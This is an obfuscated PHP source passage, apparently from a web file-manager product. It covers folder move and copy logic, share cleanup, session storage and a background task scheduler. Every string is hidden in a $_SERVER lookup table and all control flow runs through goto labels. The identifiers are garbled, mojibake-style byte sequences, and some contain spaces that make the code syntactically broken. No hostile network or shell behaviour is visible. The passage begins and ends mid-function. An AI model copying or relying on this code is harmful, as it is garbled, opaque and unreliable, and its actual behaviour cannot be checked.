{ goto Aš•½³ëÛö; C§ á‹ˆà‹: $B çÒáåº© = $EÈ÷­íÕâ­ ? $EÈ÷­íÕâ­ : $d¾’„½Ìƒ[$a™²§íä[28]]; $bæ¹¶Û½½ˆ = $this->fileNameExistCache($BÄÇ«ë‡¿, $B çÒáåº©); $this->lockMoveStart($cŒ”²£ÛæÎ); goto A…‡—ö‚; A…‡—ö‚: $this->lockWriteStart($BÄÇ«ë‡¿, $B çÒáåº©); if (!$bæ¹¶Û½½ˆ) { return $this->_moveForce($cŒ”²£ÛæÎ, $BÄÇ«ë‡¿, $B çÒáåº©); } $e‡‘Ï«Ç¢ = $bæ¹¶Û½½ˆ; goto F¤Õ†¼¤; F¤Õ†¼¤: $b˜ºˆ„–°À = !1; if ($D…î¦ ˆ×) { if ($CÃ‰Á†ß‚Ö == REPEAT_RENAME_FOLDER) { $B çÒáåº© = $this->fileNameAuto($BÄÇ«ë‡¿, $B çÒáåº©, $CÃ‰Á†ß‚Ö, $D…î¦ ˆ×); $e‡‘Ï«Ç¢ = $this->_moveForce($cŒ”²£ÛæÎ, $BÄÇ«ë‡¿, $B çÒáåº©); } else { if ($CÃ‰Á†ß‚Ö == REPEAT_RENAME_FOLDER) { $CÃ‰Á†ß‚Ö = REPEAT_RENAME; } $Cæ„©¹Š = $this->_childrenListSelect($cŒ”²£ÛæÎ); foreach ($Cæ„©¹Š as $cŠòÖ¸òìÒ) { $this->_move($cŠòÖ¸òìÒ[$a™²§íä[385]], $bæ¹¶Û½½ˆ, $CÃ‰Á†ß‚Ö, $C·»Ñ¾©); } $b˜ºˆ„–°À = !0; } } else { if ($CÃ‰Á†ß‚Ö == REPEAT_SKIP) { $b˜ºˆ„–°À = !0; } else { if ($CÃ‰Á†ß‚Ö == REPEAT_RENAME || $CÃ‰Á†ß‚Ö == REPEAT_RENAME_FOLDER) { $B çÒáåº© = $this->fileNameAuto($BÄÇ«ë‡¿, $B çÒáåº©, $CÃ‰Á†ß‚Ö, $D…î¦ ˆ×); $e‡‘Ï«Ç¢ = $this->_moveForce($cŒ”²£ÛæÎ, $BÄÇ«ë‡¿, $B çÒáåº©); } else { if ($CÃ‰Á†ß‚Ö == REPEAT_REPLACE) { $b†§ô‘×™ö = $this->sourceInfoCache($bæ¹¶Û½½ˆ); $e¡çÏò·» = $this->fileHistory($b†§ô‘×™ö, $d¾’„½Ìƒ[$a™²§íä[435]], $d¾’„½Ìƒ[$a™²§íä[77]]); if ($e¡çÏò·») { $C·»Ñ¾©[$a™²§íä[518]][] = $d¾’„½Ìƒ[$a™²§íä[435]]; } else { $b˜ºˆ„–°À = !0; } } } } } if ($b˜ºˆ„–°À && !$C·»Ñ¾©[$a™²§íä[549]]) { $C·»Ñ¾©[$a™²§íä[549]] = !0; } goto c¿ƒñâÇ; c¿ƒñâÇ: return $e‡‘Ï«Ç¢; goto aÊÙ¤î«Õ; Aš•½³ëÛö: $a™²§íä =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $d¾’„½Ìƒ = $this->sourceInfo($cŒ”²£ÛæÎ); $D…î¦ ˆ× = $d¾’„½Ìƒ[$a™²§íä[386]] == $a™²§íä[83]; goto C§ á‹ˆà‹; aÊÙ¤î«Õ: } private function _moveForce($d’·ğÇˆèª, $eÁª®Ûì‚…, $e…Å© ê±„) { goto CÉÅĞæô ; EÕ¿Ï»ôó…: if (!$e˜˜ÕØâ»í) { Model($aÅÈÌ ±[471])->authClear($d’·ğÇˆèª); } $A›ÏÉó¯ = $DÖÊ¾×”‚[$aÅÈÌ ±[413]] == $aÅÈÌ ±[83] && $cÙŸ–‡°™ù[$aÅÈÌ ±[413]] != $aÅÈÌ ±[83]; if ($A›ÏÉó¯) { $e¶ø¤Ú§[$aÅÈÌ ±[412]] = 0; } goto EŠ‹ÊçËñˆ; aòøîÁ„Ö: $d®î˜æ¾¿  = $DÖÊ¾×”‚[$aÅÈÌ ±[386]] == $aÅÈÌ ±[83]; $e¶ø¤Ú§ = array($aÅÈÌ ±[384] => $cÙŸ–‡°™ù[$aÅÈÌ ±[385]], $aÅÈÌ ±[542] => $cÙŸ–‡°™ù[$aÅÈÌ ±[476]] . $cÙŸ–‡°™ù[$aÅÈÌ ±[385]] . $aÅÈÌ ±[47], $aÅÈÌ ±[538] => $cÙŸ–‡°™ù[$aÅÈÌ ±[387]], $aÅÈÌ ±[539] => $cÙŸ–‡°™ù[$aÅÈÌ ±[473]], $aÅÈÌ ±[541] => USER_ID, $aÅÈÌ ±[402] => $e…Å© ê±„); $e˜˜ÕØâ»í = $DÖÊ¾×”‚[$aÅÈÌ ±[387]] == SourceModel::TYPE_GROUP && $cÙŸ–‡°™ù[$aÅÈÌ ±[387]] == SourceModel::TYPE_GROUP && $DÖÊ¾×”‚[$aÅÈÌ ±[473]] == $cÙŸ–‡°™ù[$aÅÈÌ ±[473]]; goto EÕ¿Ï»ôó…; EŠ‹ÊçËñˆ: if ($d®î˜æ¾¿ ) { $BÑ©¦Ù– = array($aÅÈÌ ±[542] => array($aÅÈÌ ±[500], $DÖÊ¾×”‚[$aÅÈÌ ±[476]] . $DÖÊ¾×”‚[$aÅÈÌ ±[385]] . $aÅÈÌ ±[501])); $DÀ‡ùÑ­±› = $DÖÊ¾×”‚[$aÅÈÌ ±[476]] . $DÖÊ¾×”‚[$aÅÈÌ ±[385]] . $aÅÈÌ ±[47]; $d‰¯ ªåç¹ = $cÙŸ–‡°™ù[$aÅÈÌ ±[476]] . $cÙŸ–‡°™ù[$aÅÈÌ ±[385]] . $aÅÈÌ ±[47] . $DÖÊ¾×”‚[$aÅÈÌ ±[385]] . $aÅÈÌ ±[47]; $F”Æ±øÕ£ = array($aÅÈÌ ±[542] => array($aÅÈÌ ±[550], "\162\145\160\x6c\141\x63\x65\x28\160\141\x72\145\x6e\164\x4c\145\x76\x65\154\54\47{$DÀ‡ùÑ­±›}\x27\x2c\47{$d‰¯ ªåç¹}\x27\x29"), $aÅÈÌ ±[538] => $cÙŸ–‡°™ù[$aÅÈÌ ±[387]], $aÅÈÌ ±[539] => $cÙŸ–‡°™ù[$aÅÈÌ ±[473]]); if ($A›ÏÉó¯) { $F”Æ±øÕ£[$aÅÈÌ ±[412]] = 0; } $this->where($BÑ©¦Ù–)->data($F”Æ±øÕ£)->save(); } $this->where(array($aÅÈÌ ±[399] => $d’·ğÇˆèª))->data($e¶ø¤Ú§)->save(); return $d’·ğÇˆèª; goto F“Íñ£Øê÷; CÉÅĞæô : $aÅÈÌ ± =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DÖÊ¾×”‚ = $this->sourceInfo($d’·ğÇˆèª); $cÙŸ–‡°™ù = $this->sourceInfo($eÁª®Ûì‚…); goto aòøîÁ„Ö; F“Íñ£Øê÷: } private function clearShare($eëÎªÁ‰ôê, $E‚Ê¶¹Íôí) { goto F™ÃÊµ¿âï; fÛùä‰î±ñ: Model($cÑğ¬Â‰[552])->where($FğŸ˜±Ûå¸)->save(array($cÑğ¬Â‰[463] => 0)); Model($cÑğ¬Â‰[553])->where($FğŸ˜±Ûå¸)->delete(); goto F¬¨í÷²î·; F™ÃÊµ¿âï: $cÑğ¬Â‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a¥Ìİ È¶Ã = $this->sourceInfo($eëÎªÁ‰ôê); $F˜¦¸šºÇ = $this->sourceInfo($E‚Ê¶¹Íôí); goto D¡×ÕÎìÓ; fÃŠàÂõ‰ª: if (!$CÕÜ”İƒİù) { return; } $FğŸ˜±Ûå¸ = array($cÑğ¬Â‰[385] => array($cÑğ¬Â‰[7], $CÕÜ”İƒİù), $cÑğ¬Â‰[463] => 1); $BÁÃµìõê« = Model($cÑğ¬Â‰[552])->field($cÑğ¬Â‰[456])->where($FğŸ˜±Ûå¸)->select(); goto aï”æ„º¥†; aï”æ„º¥†: if (!$BÁÃµìõê«) { return; } $BÁÃµìõê« = array_to_keyvalue($BÁÃµìõê«, $cÑğ¬Â‰[33], $cÑğ¬Â‰[456]); $FğŸ˜±Ûå¸ = array($cÑğ¬Â‰[456] => array($cÑğ¬Â‰[7], $BÁÃµìõê«)); goto fÛùä‰î±ñ; D¡×ÕÎìÓ: if ($a¥Ìİ È¶Ã[$cÑğ¬Â‰[473]] == $F˜¦¸šºÇ[$cÑğ¬Â‰[473]] && $a¥Ìİ È¶Ã[$cÑğ¬Â‰[387]] == $cÑğ¬Â‰[551]) { return; } $FğŸ˜±Ûå¸ = array($cÑğ¬Â‰[476] => array($cÑğ¬Â‰[500], $a¥Ìİ È¶Ã[$cÑğ¬Â‰[476]] . $eëÎªÁ‰ôê . $cÑğ¬Â‰[501])); $CÕÜ”İƒİù = $this->field($cÑğ¬Â‰[399])->where($FğŸ˜±Ûå¸)->getField($cÑğ¬Â‰[385], !0); goto fÃŠàÂõ‰ª; F¬¨í÷²î·: } public function copyFolderFromIO($AÉ„¸‡ÃªÍ, $E³â„´¹ó­, $DàïÁ‚©Ğ³, $fÃšÁç¾Ô, $e·¬°Ë©¤, $Aœé¹¼¢Üñ = false) { goto cÆÄç—öÅ…; D›æ½¤Û: $Eé„³Ûõš‡ = $this->fileNameExist($DàïÁ‚©Ğ³, $B…àÎØöÜÑ); $BàÓâ†ªĞ– = $this->mkdir($DàïÁ‚©Ğ³, $B…àÎØöÜÑ, $fÃšÁç¾Ô); if (!$Eé„³Ûõš‡ || $fÃšÁç¾Ô == REPEAT_RENAME_FOLDER) { $fÃšÁç¾Ô = !1; } goto bŠØäÓ˜º™; bŠØäÓ˜º™: if ($Eé„³Ûõš‡) { $this->_childrenAllMake($Eé„³Ûõš‡); } Hook::trigger($fíª¿ô»ì[555]); $this->_copyChildTo($AÉ„¸‡ÃªÍ, $E³â„´¹ó­, $BàÓâ†ªĞ–, $fÃšÁç¾Ô, $cÍ—åÜ¶„, $e·¬°Ë©¤); goto Cè¤Œ£¸ô’; Cè¤Œ£¸ô’: Hook::trigger($fíª¿ô»ì[556]); if ($BàÓâ†ªĞ–) { $this->folderSizeResetChildren($BàÓâ†ªĞ–); } $this->_childrenListClear(); goto E»”˜òÄ–â; aŞàù¹àö›: Model($fíª¿ô»ì[438])->linkAdd($cÍ—åÜ¶„[$fíª¿ô»ì[518]]); Model($fíª¿ô»ì[438])->remove($cÍ—åÜ¶„[$fíª¿ô»ì[554]]); $this->folderSizeReset($DàïÁ‚©Ğ³); goto D¹†öéæƒ‰; E»”˜òÄ–â: Model($fíª¿ô»ì[521])->addAll($cÍ—åÜ¶„[$fíª¿ô»ì[519]], array(), !0); Model($fíª¿ô»ì[522])->eventCopy($BàÓâ†ªĞ–); $this->saveAll($cÍ—åÜ¶„[$fíª¿ô»ì[520]]); goto aŞàù¹àö›; cÆÄç—öÅ…: $fíª¿ô»ì =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cÍ—åÜ¶„ = array($fíª¿ô»ì[519] => array(), $fíª¿ô»ì[520] => array(), $fíª¿ô»ì[518] => array(), $fíª¿ô»ì[554] => array()); $B…àÎØöÜÑ = $Aœé¹¼¢Üñ ? $Aœé¹¼¢Üñ : $AÉ„¸‡ÃªÍ->pathThis($E³â„´¹ó­); goto D›æ½¤Û; D¹†öéæƒ‰: $this->updateModifyTime($DàïÁ‚©Ğ³); return $BàÓâ†ªĞ–; goto fÙ”Ù½Š‘Ë; fÙ”Ù½Š‘Ë: } private function _copyChildTo($dòØ›Ñï¼­, $FõÇ§¸‹ì, $cÌíóäÊ®è, $b­‡¬ÎÙÓ¡, &$CÙ¹ËË—¨Å, $b©êŠ–·ĞÆ) { goto bÚ»Ş”‹Æ; E´›çÂ³ÚÖ: foreach ($C‚õ¾ –ÕÇ as &$D¿»ÌÄ´ù½) { goto CŞë¯Åâó¹; bŞô©íöå: if ($b­‡¬ÎÙÓ¡) { $aƒ¾ÂãÕ‡ = $this->fileNameExistCache($cÌíóäÊ®è, $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[28]]); if ($aƒ¾ÂãÕ‡) { if ($D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[386]] || $b­‡¬ÎÙÓ¡ == REPEAT_SKIP) { continue; } if ($b­‡¬ÎÙÓ¡ == REPEAT_REPLACE) { $CÚë§Ø = $this->sourceInfoCache($aƒ¾ÂãÕ‡); $f«¨íõƒÛ„ = $this->fileHistory($CÚë§Ø, $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[435]], $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[77]]); if ($f«¨íõƒÛ„) { $CÙ¹ËË—¨Å[$D£Í¦Ó•“¾[518]][] = $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[435]]; } continue; } else { if ($b­‡¬ÎÙÓ¡ == REPEAT_RENAME) { $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[28]] = $this->fileNameAutoCache($cÌíóäÊ®è, $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[28]], $b­‡¬ÎÙÓ¡, !1); } } } } if (!$D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[386]] && $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[435]]) { $CÙ¹ËË—¨Å[$D£Í¦Ó•“¾[518]][] = $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[435]]; } $F–…‹³¼ ó[] = $this->_makeItemData($D¿»ÌÄ´ù½, $Eèğ›“Ìá¬, $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[28]]); goto FßÊ²®ÎÂÊ; CŞë¯Åâó¹: if (isset($DËæÓÅË“[$D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[28]]])) { $D¿»ÌÄ´ù½ = $DËæÓÅË“[$D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[28]]]; } $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[386]] = $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[29]] == $D£Í¦Ó•“¾[76]; $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[388]] = _get($D¿»ÌÄ´ù½, $D£Í¦Ó•“¾[165], $D£Í¦Ó•“¾[33]); goto B®ÕºĞª·; B®ÕºĞª·: $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[77]] = _get($D¿»ÌÄ´ù½, $D£Í¦Ó•“¾[77], 0); $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[435]] = _get($D¿»ÌÄ´ù½, $D£Í¦Ó•“¾[435], 0); if (!isset($D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[557]]) && $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[435]]) { $CÙ¹ËË—¨Å[$D£Í¦Ó•“¾[554]][] = $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[435]]; } goto bŞô©íöå; FßÊ²®ÎÂÊ: } unset($D¿»ÌÄ´ù½); if (!empty($F–…‹³¼ ó)) { $this->addAll($F–…‹³¼ ó); $this->_childrenListSelect($cÌíóäÊ®è); } goto B’ºÚŸ¸×; bÚ»Ş”‹Æ: $D£Í¦Ó•“¾ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Eèğ›“Ìá¬ = $this->sourceInfoCache($cÌíóäÊ®è); $E˜¦ ğ·ê‘ = $dòØ›Ñï¼­->listPath($FõÇ§¸‹ì); goto FŠàç‡ñ‹Ê; FŠàç‡ñ‹Ê: $C‚õ¾ –ÕÇ = array_merge($E˜¦ ğ·ê‘[$D£Í¦Ó•“¾[73]], $E˜¦ ğ·ê‘[$D£Í¦Ó•“¾[74]]); $DËæÓÅË“ = $this->_addFiles($dòØ›Ñï¼­, $E˜¦ ğ·ê‘[$D£Í¦Ó•“¾[73]], $b©êŠ–·ĞÆ); $F–…‹³¼ ó = array(); goto E´›çÂ³ÚÖ; B’ºÚŸ¸×: $eõøÏõ Ö = $this->_childrenList($cÌíóäÊ®è); $eõøÏõ Ö = array_to_keyvalue($eõøÏõ Ö, $D£Í¦Ó•“¾[28]); foreach ($C‚õ¾ –ÕÇ as $D¿»ÌÄ´ù½) { $CÚë§Ø = $eõøÏõ Ö[$D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[28]]]; $FÓˆØà¤Î = $CÚë§Ø[$D£Í¦Ó•“¾[385]]; $this->_copyApplyMeta($CÚë§Ø, $CÙ¹ËË—¨Å); if ($D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[29]] == $D£Í¦Ó•“¾[76]) { $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[75]] = $dòØ›Ñï¼­->getPathInner($D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[75]]); $this->_copyChildTo($dòØ›Ñï¼­, $D¿»ÌÄ´ù½[$D£Í¦Ó•“¾[75]], $FÓˆØà¤Î, $b­‡¬ÎÙÓ¡, $CÙ¹ËË—¨Å, $b©êŠ–·ĞÆ); } } goto Aëô‡„²Áê; Aëô‡„²Áê: } private function _addFiles($A¤æœå‚·, $A¹Êæ©³“, $cĞ×·Ä÷¦‡) { goto E‰Æ¹Şµ; aíà–î›ÍÙ: foreach ($Bë”÷¾šÖ as $C¾îó…÷‘ƒ) { if (!isset($d§ŞÀÃÄ©Ö[$C¾îó…÷‘ƒ[$e†Ö“Ü‰¼[167]]])) { continue; } $cìóËÒìÓÏ = $d§ŞÀÃÄ©Ö[$C¾îó…÷‘ƒ[$e†Ö“Ü‰¼[167]]]; foreach ($cìóËÒìÓÏ as &$Dë¨Ø·—¥£) { $Dë¨Ø·—¥£[$e†Ö“Ü‰¼[435]] = $C¾îó…÷‘ƒ[$e†Ö“Ü‰¼[435]]; $Dë¨Ø·—¥£[$e†Ö“Ü‰¼[557]] = !0; } unset($Dë¨Ø·—¥£); } $B˜ãŸ»õ÷¥ = array(); foreach ($A¹Êæ©³“ as $DÃ„¹éç«) { if (isset($DÃ„¹éç«[$e†Ö“Ü‰¼[557]]) && $DÃ„¹éç«[$e†Ö“Ü‰¼[557]]) { continue; } $D± î‘Ğ = $A¤æœå‚·->getPathInner($DÃ„¹éç«[$e†Ö“Ü‰¼[75]]); $C‹ØôæŸâ = $DßÆØ›‰Ó->addFileMake($D± î‘Ğ, $DÃ„¹éç«[$e†Ö“Ü‰¼[77]], $DÃ„¹éç«[$e†Ö“Ü‰¼[168]], $DÃ„¹éç«[$e†Ö“Ü‰¼[167]], $DÃ„¹éç«[$e†Ö“Ü‰¼[28]], $cĞ×·Ä÷¦‡); $B˜ãŸ»õ÷¥[] = $C‹ØôæŸâ; } goto A¬Õ¬“åä; CåÎÏ¤™Ë¸: $DßÆØ›‰Ó = Model($e†Ö“Ü‰¼[560]); $Bë”÷¾šÖ = $DßÆØ›‰Ó->where($aĞŒ£¾×ƒˆ)->select(); $Bë”÷¾šÖ = $Bë”÷¾šÖ ? $Bë”÷¾šÖ : array(); goto aíà–î›ÍÙ; CŸÓ´œ¡¤œ: foreach ($A¹Êæ©³“ as $DŠ²êá®ë) { $b¸ùóÚ¢êÂ[$DŠ²êá®ë[$e†Ö“Ü‰¼[28]]] = $DŠ²êá®ë; } return $b¸ùóÚ¢êÂ; goto cÆÀØÄîéÁ; bÙ÷„Í‚: foreach ($A¹Êæ©³“ as &$Dë¨Ø·—¥£) { goto c¦µç”ìõù; c¦µç”ìõù: Hook::trigger($e†Ö“Ü‰¼[558], $Dë¨Ø·—¥£); $Dë¨Ø·—¥£[$e†Ö“Ü‰¼[75]] = $A¤æœå‚·->getPathInner($Dë¨Ø·—¥£[$e†Ö“Ü‰¼[75]]); $c‚æ•Ï = $A¤æœå‚·->hashSimple($Dë¨Ø·—¥£[$e†Ö“Ü‰¼[75]]); goto A÷¬ÊˆÁÂé; aìˆö™ è: if (count($d§ŞÀÃÄ©Ö[$b‰™®Òëõ]) > 1) { $Dë¨Ø·—¥£[$e†Ö“Ü‰¼[557]] = !0; } goto d‘‚¿ÕÈÔ; A÷¬ÊˆÁÂé: $b‰™®Òëõ = $A¤æœå‚·->hashMd5($Dë¨Ø·—¥£[$e†Ö“Ü‰¼[75]]); if (strlen($b‰™®Òëõ) > 10 && !isset($d§ŞÀÃÄ©Ö[$b‰™®Òëõ])) { $d§ŞÀÃÄ©Ö[$b‰™®Òëõ] = array(); } $Dë¨Ø·—¥£[$e†Ö“Ü‰¼[168]] = $c‚æ•Ï; goto DìÜÊøÛˆï; DìÜÊøÛˆï: $Dë¨Ø·—¥£[$e†Ö“Ü‰¼[167]] = $b‰™®Òëõ; Hook::trigger($e†Ö“Ü‰¼[559], $Dë¨Ø·—¥£); $d§ŞÀÃÄ©Ö[$b‰™®Òëõ][] =& $Dë¨Ø·—¥£; goto aìˆö™ è; d‘‚¿ÕÈÔ: } unset($Dë¨Ø·—¥£); $aĞŒ£¾×ƒˆ = array($e†Ö“Ü‰¼[167] => array($e†Ö“Ü‰¼[7], array_keys($d§ŞÀÃÄ©Ö))); goto CåÎÏ¤™Ë¸; A¬Õ¬“åä: $DßÆØ›‰Ó->addAll($B˜ãŸ»õ÷¥); $aĞŒ£¾×ƒˆ = array($e†Ö“Ü‰¼[167] => array($e†Ö“Ü‰¼[7], array_keys($d§ŞÀÃÄ©Ö))); $Bë”÷¾šÖ = $DßÆØ›‰Ó->where($aĞŒ£¾×ƒˆ)->select(); goto A®ê¿¤¥¶–; E‰Æ¹Şµ: $e†Ö“Ü‰¼ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$A¹Êæ©³“ || count($A¹Êæ©³“) == 0) { return array(); } $d§ŞÀÃÄ©Ö = array(); goto bÙ÷„Í‚; A®ê¿¤¥¶–: $Bë”÷¾šÖ = $Bë”÷¾šÖ ? $Bë”÷¾šÖ : array(); foreach ($Bë”÷¾šÖ as $C¾îó…÷‘ƒ) { if (!isset($d§ŞÀÃÄ©Ö[$C¾îó…÷‘ƒ[$e†Ö“Ü‰¼[167]]])) { continue; } $A–øÅÏÊŠ— =& $d§ŞÀÃÄ©Ö[$C¾îó…÷‘ƒ[$e†Ö“Ü‰¼[167]]]; foreach ($A–øÅÏÊŠ— as &$Dë¨Ø·—¥£) { $Dë¨Ø·—¥£[$e†Ö“Ü‰¼[435]] = $C¾îó…÷‘ƒ[$e†Ö“Ü‰¼[435]]; } unset($Dë¨Ø·—¥£); } $b¸ùóÚ¢êÂ = array(); goto CŸÓ´œ¡¤œ; cÆÀØÄîéÁ: } } define($_SERVER[ÈİÅ¿ÈÈ¥×][561], $_SERVER[ÈİÅ¿ÈÈ¥×][562]); goto FŒ—‡¶ÉÇÛ; AÁ„ëš©Â: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto e×µŸéĞÎ; dÄôÛÀŸÁ÷: $BøÍ†‘¸½Ò = $fÕÊ†‹¯ºÄ[$cÂÓ®ÜĞˆë]; $aø£©Õ–‡ = $fÕÊ†‹¯ºÄ[$D«£ä…éÕ[762]]; switch ($cÂÓ®ÜĞˆë) { case $D«£ä…éÕ[17]: self::$handle = Model($D«£ä…éÕ[763]); break; case $D«£ä…éÕ[764]: self::$handle = new CacheRedis($BøÍ†‘¸½Ò, $aø£©Õ–‡); break; case $D«£ä…éÕ[765]: self::$handle = new CacheMemcached($BøÍ†‘¸½Ò, $aø£©Õ–‡); break; case $D«£ä…éÕ[171]: $BøÍ†‘¸½Ò[$D«£ä…éÕ[75]] = $BøÍ†‘¸½Ò[$D«£ä…éÕ[75]] . $D«£ä…éÕ[1452]; self::$handle = new CacheFile($BøÍ†‘¸½Ò, $aø£©Õ–‡); default: break; } goto dÒ®œã‹†Ì; e×µŸéĞÎ: $D«£ä…éÕ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; static $d±ôîùÔÈ± = false; if ($d±ôîùÔÈ±) { return $d±ôîùÔÈ±; } goto A™¿„õâ¸; E“¹…¿İ¸: if (self::$sessionSign) { } else { if (Cookie::get($dŠ”ÑõŒ )) { self::$sessionSign = Cookie::get($dŠ”ÑõŒ ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($dŠ”ÑõŒ , self::$sessionSign, self::$sessionTime); $cÂÓ®ÜĞˆë = $fÕÊ†‹¯ºÄ[$D«£ä…éÕ[1451]]; goto dÄôÛÀŸÁ÷; dÒ®œã‹†Ì: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $d±ôîùÔÈ± = new self(); return $d±ôîùÔÈ±; goto C·«ˆ××‘; A™¿„õâ¸: $fÕÊ†‹¯ºÄ = $GLOBALS[$D«£ä…éÕ[6]][$D«£ä…éÕ[343]]; self::$sessionTime = $fÕÊ†‹¯ºÄ[$D«£ä…éÕ[1449]]; $dŠ”ÑõŒ  = isset($GLOBALS[$D«£ä…éÕ[1450]]) ? $GLOBALS[$D«£ä…éÕ[1450]] : SESSION_ID; goto E“¹…¿İ¸; C·«ˆ××‘: } public static function sign($aùÜ™œöèæ = false) { $aùÜ™œöèæ && (self::$sessionSign = $aùÜ™œöèæ); self::init(); return self::$sessionSign; } public static function set($Eµ±ï–îÙ, $C¥åƒ™Ğô¶ = false) { self::init(); if (is_array($Eµ±ï–îÙ)) { foreach ($Eµ±ï–îÙ as $bÎİø™œ‰ => $fˆ™…³À†) { array_set_value(self::$data, $bÎİø™œ‰, $fˆ™…³À†); } } else { array_set_value(self::$data, $Eµ±ï–îÙ, $C¥åƒ™Ğô¶); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($FÁæèòª—¾ = false) { self::init(); if (!$FÁæèòª—¾) { return self::$data; } return array_get_value(self::$data, $FÁæèòª—¾); } public static function remove($aÚ°Ì±ĞÑ®) { self::init(); unset(self::$data[$aÚ°Ì±ĞÑ®]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ÈİÅ¿ÈÈ¥×][767])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto bÒ­……·é; FõÕ‚Ãµ¤Â: http_close(); self::valueSet($d‚£Ÿ»°•Ê[1453], $d‚£Ÿ»°•Ê[83]); Hook::bind($d‚£Ÿ»°•Ê[1455], $d‚£Ÿ»°•Ê[1456]); goto C‹–Ã‡Öã­; bÒ­……·é: $d‚£Ÿ»°•Ê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (self::valueGet($d‚£Ÿ»°•Ê[697]) != $d‚£Ÿ»°•Ê[83]) { return; } if (self::valueGet($d‚£Ÿ»°•Ê[1453]) == $d‚£Ÿ»°•Ê[83]) { $bÅíˆÌğÃ = self::valueGet($d‚£Ÿ»°•Ê[1454]); if (time() - $bÅíˆÌğÃ > 3600 * 2) { self::restart(); } return; } goto FõÕ‚Ãµ¤Â; C‹–Ã‡Öã­: while (!0) { self::cacheClear(); if (self::valueGet($d‚£Ÿ»°•Ê[697]) != $d‚£Ÿ»°•Ê[83]) { self::valueSet($d‚£Ÿ»°•Ê[1453], $d‚£Ÿ»°•Ê[485]); self::log($d‚£Ÿ»°•Ê[1457]); die; } self::valueSet($d‚£Ÿ»°•Ê[1453], $d‚£Ÿ»°•Ê[83]); self::valueSet($d‚£Ÿ»°•Ê[1454], time()); self::taskRunAll(); sleep(self::valueGet($d‚£Ÿ»°•Ê[1458])); } goto E—‡–‘œëé; E—‡–‘œëé: } public static function restart() { $A¬õËó†… =& $_SERVER[ÈİÅ¿ÈÈ¥×]; http_close(); self::valueSet($A¬õËó†…[697], $A¬õËó†…[485]); sleep(self::valueGet($A¬õËó†…[1458]) + 5); self::valueSet($A¬õËó†…[1453], $A¬õËó†…[485]); self::valueSet($A¬õËó†…[697], $A¬õËó†…[83]); } public static function shutdownEvent() { $DËËâ±„×“ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; self::valueSet($DËËâ±„×“[1453], $DËËâ±„×“[485]); self::log($DËËâ±„×“[1459]); } public static function config($AÌ¸Ïùî™å, $Câà…â¿ëĞ) { $b‡ÁÒØë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dšÚ×®×Í = 10; $Câà…â¿ëĞ = intval($Câà…â¿ëĞ) <= $dšÚ×®×Í ? $dšÚ×®×Í : intval($Câà…â¿ëĞ); self::valueSet($b‡ÁÒØë[697], $AÌ¸Ïùî™å); self::valueSet($b‡ÁÒØë[1458], $Câà…â¿ëĞ); } private static function taskRunAll() { goto b¡·ƒ‚˜; b¡·ƒ‚˜: $CßÓĞÖà²¶ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aÛ±×ÚßèÄ = timeFloat(); $dìÚƒËÑáÊ = Model($CßÓĞÖà²¶[1460])->listData(); goto c¶å¹¡ğ; c¶å¹¡ğ: $EÄ…ÒˆŒÃ = count($dìÚƒËÑáÊ); for ($A•¢š¯³§ë = 0; $A•¢š¯³§ë < $EÄ…ÒˆŒÃ; $A•¢š¯³§ë++) { $d¸¬Ëâì = $dìÚƒËÑáÊ[$A•¢š¯³§ë]; if (!$d¸¬Ëâì[$CßÓĞÖà²¶[383]] || $d¸¬Ëâì[$CßÓĞÖà²¶[1461]] != $CßÓĞÖà²¶[83]) { continue; } if (!self::taskTimeCheck($d¸¬Ëâì)) { continue; } self::taskRun($d¸¬Ëâì); } Hook::trigger($CßÓĞÖà²¶[1462]); goto CáÌª±˜ÚÖ; CáÌª±˜ÚÖ: self::taskQueueRun($aÛ±×ÚßèÄ); self::closeDatabase(); goto DÙ‹ÖßáÍ; DÙ‹ÖßáÍ: } private static function taskQueueRun($Fù¶¼â›É) { 